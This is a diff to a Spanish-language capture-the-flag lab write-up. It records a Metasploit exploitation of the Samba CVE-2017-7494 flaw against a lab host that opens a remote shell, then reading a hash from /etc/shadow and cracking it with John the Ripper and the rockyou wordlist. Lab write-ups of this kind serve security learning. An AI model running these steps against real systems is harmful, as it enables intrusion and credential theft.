@@ -432,8 +432,80 @@ sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
 bind:x:105:112::/var/cache/bind:/bin/false
 bluffer:x:1001:1001:Player Bluffer,,,:/home/bluffer:/bin/rbash
 
+msfconsole
 
+msf6 > search CVE-2017-7494
+
+Buscamos el exploit de la vulnerabilidad.
+
+Matching Modules
+================
+
+   #   Name                                   Disclosure Date  Rank       Check  Description
+   -   ----                                   ---------------  ----       -----  -----------
+   0   exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+
+
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(linux/samba/is_known_pipename) > show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CHOST                            no        The local client address
+   CPORT                            no        The local client port
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-
+                                              metasploit/basics/using-metasploit.html
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+
+msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 10.10.129.142
+RHOSTS => 10.10.129.142
+msf6 exploit(linux/samba/is_known_pipename) > set RPORT 44544
+RPORT => 44544
+
+Configuramos el exploit seleccionando el puerto de escucha de SMB y la ip objetivo de la victima.
+
+msf6 exploit(linux/samba/is_known_pipename) > exploit
+[*] 10.10.129.142:44544 - Using location \\10.10.129.142\nebula_share\ for the path
+[*] 10.10.129.142:44544 - Retrieving the remote path of the share 'nebula_share'
+[*] 10.10.129.142:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
+[*] 10.10.129.142:44544 - Uploaded payload to \\10.10.129.142\nebula_share\IAHdiPRG.so
+[*] 10.10.129.142:44544 - Loading the payload from server-side path /srv/samba/share/IAHdiPRG.so using \\PIPE\/srv/samba/share/IAHdiPRG.so...
+[-] 10.10.129.142:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 10.10.129.142:44544 - Loading the payload from server-side path /srv/samba/share/IAHdiPRG.so using /srv/samba/share/IAHdiPRG.so...
+[+] 10.10.129.142:44544 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+[*] Command shell session 1 opened (10.21.127.199:36301 -> 10.10.129.142:44544) at 2025-04-17 04:43:35 -0400
+
+Ejecutamos el exploit y ya estamos dentro.
 
 ~ Task 11 ~
 
-Yo sé que se hace con John the Ripper, ya que conozco el programa pero nunca lo he utilizado, sé que descifra hash.
+Cogemos el hash de guakamole que se encuentra en /etc/shadow
+
+Creamos un fichero .txt y lo metemos dentro
+
+usamos el comando John fichero.txt
+
+y esperamos un buen rato para ver si lo descifra.
+
+john --wordlist=/home/kali/nebula/rockyou.txt hashguakamole.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+kamikaze2        (?)     
+1g 0:00:07:17 DONE (2025-04-17 05:13) 0.002287g/s 1458p/s 1458c/s 1458C/s kanojo..kalief
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+¿De donde sacamos el .txt de rockyou.txt? Lo sacamos de la carpeta de Hydra, que esta en .tar.gz, lo extraemos, cogemos este diccionario 
+y lo utilizamos para este proceso.
+
